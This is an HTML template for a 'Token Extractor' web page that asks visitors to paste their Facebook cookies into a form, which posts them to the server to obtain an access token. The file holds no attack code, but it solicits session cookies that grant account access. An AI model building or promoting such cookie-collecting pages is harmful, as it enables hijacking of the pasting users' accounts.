<!-- templates/token_form.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Token Extractor</title>
    <style>
        body {
            background: black;
            color: white;
            text-align: center;
            font-family: monospace;
        }
        textarea, input {
            width: 80%;
            padding: 10px;
            border: 1px solid #00ff00;
            background: #111;
            color: #0f0;
        }
        button {
            padding: 10px 20px;
            background: #0f0;
            color: black;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h2>Paste your Facebook Cookies below</h2>
    <form method="post">
        <textarea name="cookie" rows="8" required></textarea><br><br>
        <button type="submit">Extract Token</button>
    </form>
</body>
</html>
